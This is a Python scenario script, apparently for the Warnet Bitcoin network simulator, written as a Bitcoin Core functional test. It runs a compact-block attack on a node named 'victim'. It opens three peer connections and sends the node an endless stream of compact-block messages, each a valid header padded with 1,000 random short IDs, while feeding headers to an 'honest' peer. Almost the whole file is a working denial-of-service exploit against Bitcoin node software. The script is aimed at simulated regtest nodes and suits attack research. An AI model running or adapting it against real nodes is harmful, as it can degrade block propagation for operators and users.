#!/usr/bin/env python3

import random
import socket
from datetime import (
    datetime,
    timedelta,
)

from commander import Commander

from test_framework.blocktools import (
    create_block,
    NORMAL_GBT_REQUEST_PARAMS
)

# The entire Bitcoin Core test_framework directory is available as a library
from test_framework.messages import (
    CBlockHeader,
    CInv,
    HeaderAndShortIDs,
    msg_block,
    msg_cmpctblock,
    msg_headers,
)

from test_framework.p2p import (
    P2PInterface,
)

# The actual scenario is a class like a Bitcoin Core functional test.
# Commander is a subclass of BitcoinTestFramework instide Warnet
# that allows to operate on containerized nodes instead of local nodes.

class CmpctAtk(Commander):
    def set_test_params(self):
        # This setting is ignored but still required as
        # a sub-class of BitcoinTestFramework
        self.num_nodes = 0

    def add_options(self, parser):
        parser.description = (
            "CMPCT BLOCKS THEY SLOW"
        )
        parser.usage = "warnet run scenarios/cmpctatk.py"



    def connect_to_hostname(self, hostname):
        # regtest or signet
        chain = self.nodes[0].chain

        # The victim's address could be an explicit IP address
        # OR a kubernetes hostname (use default chain p2p port)
        dstaddr = socket.gethostbyname(hostname)
        if chain == "regtest":
            dstport = 18444

        conn = P2PInterface()
        conn.peer_connect(
            dstaddr=dstaddr, dstport=dstport, net="regtest", timeout_factor=1
        )()
        conn.wait_until(lambda: conn.is_connected, check_connected=False)
        return conn

    def build_block_on_tip(self, node):
        block = create_block(tmpl=node.getblocktemplate(NORMAL_GBT_REQUEST_PARAMS))
        block.solve()
        return block

    def build_fat_empty_cmpct(self, block):
        cmpct_block = HeaderAndShortIDs()
        cmpct_block.header = CBlockHeader(block)

        for i in range(1_000):
            shortid = int.from_bytes(random.randbytes(6), byteorder='little')
            cmpct_block.shortids.append(shortid)

        return cmpct_block

    def run_test(self):
        victim = "tank1"
        honest = "tank2"

        # Now we will use a python-based Bitcoin p2p node to send very specific,
        # unusual or non-standard messages to a "victim" node.
        self.log.info(f"Attacking {victim}")
        attackers = []
        for i in range(3):
            attackers.append(self.connect_to_hostname(victim))

        honestpeer = self.connect_to_hostname(honest)

        real_block = self.build_block_on_tip(self.nodes[0])
        attack_block = self.build_fat_empty_cmpct(real_block)
        attack_block_msg = msg_cmpctblock(attack_block.to_p2p())
        next_block_interrupt_time = datetime.now() + timedelta(seconds=30)
        while True:
            now = datetime.now()
            if now > next_block_interrupt_time:
                real_block = self.build_block_on_tip(self.nodes[0])
                attack_block = self.build_fat_empty_cmpct(real_block)
                attack_block_msg = msg_cmpctblock(attack_block.to_p2p())
                next_block_interrupt_time = datetime.now() + timedelta(seconds=30)

            for victim_conn in attackers:
                victim_conn.send_message(attack_block_msg)

            honestpeer_getdata = honestpeer.last_message.get("getdata")
            if honestpeer_getdata is not None:
                print(f"Inv hash: {honestpeer_getdata.inv[0].hash}")
                print(f"expected hash: {real_block.hash}")

            if honestpeer_getdata is not None and any(inv.hash == real_block.hash for inv in honestpeer_getdata.inv):
                print("This never happens!")
                honestpeer.send_and_ping(msg_block(real_block))
            else:
                headers_message = msg_headers()
                headers_message.headers = [CBlockHeader(real_block)]
                honestpeer.send_message(headers_message)


def main():
    CmpctAtk().main()


if __name__ == "__main__":
    main()
